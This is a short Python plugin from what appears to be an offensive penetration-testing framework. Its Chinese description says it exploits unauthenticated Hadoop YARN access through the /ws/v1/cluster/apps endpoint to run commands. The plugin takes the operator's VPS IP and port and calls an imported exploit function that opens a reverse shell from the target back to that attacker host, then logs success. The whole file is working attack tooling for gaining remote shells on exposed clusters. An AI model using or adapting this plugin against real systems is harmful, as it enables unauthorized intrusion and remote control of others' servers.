from plugins.lib.hadoop.main import exploit
from plugins.plugin import Plugin


class RTPlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.name = "hadoop_unauthorized"
        self.type = self.URL_SHELL
        self.desc = "hadoop未授权访问，通过向/ws/v1/cluster/apps发送请求执行命令，本插件通过输入vps的ip和port，反弹shell，仅支持linux"

    def _run(self):
        _ = self.vps.split(":")
        host = _[0]
        port = _[1]
        self.log(f"发送请求：{self.url},反弹shell vps host:{host} 端口：{port}")
        exploit(self.url, host, port)
        self.log(f"反弹shell成功")

